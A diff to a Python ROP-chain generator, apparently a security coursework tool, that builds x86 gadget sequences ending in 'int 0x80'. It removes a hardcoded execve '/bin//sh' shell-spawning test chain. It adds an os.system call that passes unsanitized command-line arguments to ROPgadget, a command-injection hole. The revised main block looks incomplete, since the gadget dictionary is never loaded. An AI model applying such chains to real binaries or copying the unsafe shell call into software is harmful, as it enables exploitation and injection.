@@ -4,6 +4,8 @@ from ROPcompile import dataaddressToValue
 from ROPcompile import generalToBytes
 import re
 from Systems import *
+import sys
+import os
 registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]
 
 def addRet(gadget):
@@ -134,8 +136,8 @@ def setExecutionSearch(startstate, endstate, Gadgets):
     xorcontrolled = xorcontrol(Gadgets)
     for i in range(len(registersToSet)):
         if registersToSet[i] == True and xorcontrolled[i] == True:
-            execution.extend([("inc " + registers[i] + " ; ret")] * int.from_bytes(getFromLoc(endstate, registers[i]), byteorder="little"))
             execution.append("xor " + registers[i] + ", " + registers[i] + " ; ret")
+            execution.extend([("inc " + registers[i] + " ; ret")] * int.from_bytes(getFromLoc(endstate, registers[i]), byteorder="little"))
             setToLoc(endstate, registers[i], None)
             return execution
 
@@ -144,10 +146,7 @@ def findExecution(startstate, endstate, Gadgets):
     if startstate.datavalues != endstate.datavalues:
         return writeExecutionSearch(startstate, endstate, Gadgets)
     while sum(regToSet(startstate, endstate)) != 0:
-        print(startstate.allRegisters())
-        print(endstate.allRegisters())
         section = setExecutionSearch(startstate, endstate, Gadgets)
-        print(section)
         if section is None:
             return []
         section.extend(execution)
@@ -192,18 +191,29 @@ def create(shellcode, gadgets):
     TestSystem = SysState()
     run(TestSystem, execution)
     TestSystem.printSystem()
-    print(execution)
     execution.append("int 0x80")
     #Return Sequence of Gadgets
+    print(execution)
     return execution
 
+def fileCheck(fileloc):
+    try:
+        f = open(fileloc, "r")
+        f.close()
+    except:
+        print("Could not open file " + fileloc + " for read")
+        quit()
+
 if __name__ == "__main__":
-    #gadgets = ["pop edx ; ret", "pop eax ; ret", "mov dword ptr [edx], eax ; ret", "xor eax, eax ; ret", "pop ebx ; ret", "pop ecx ; ret"]
 
-    import ROPcompile
+    if len(sys.argv) != 3:
+        print("Expected 2 arguments, got " + str(len(sys.argv)-1))
+        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation")
+        quit()
+    fileCheck(sys.argv[1])
+    fileCheck(sys.argv[2])
+
     dictionary = {}
-    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
-    gadgets = dictionary.keys()
-
-    print("CREATE TEST")
-    create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
+    os.system("ROPgadget --binary " + sys.argv[1] + " > rop.txt")
+    shellcode = []
+    payload = create(shellcode, dictionary.keys())
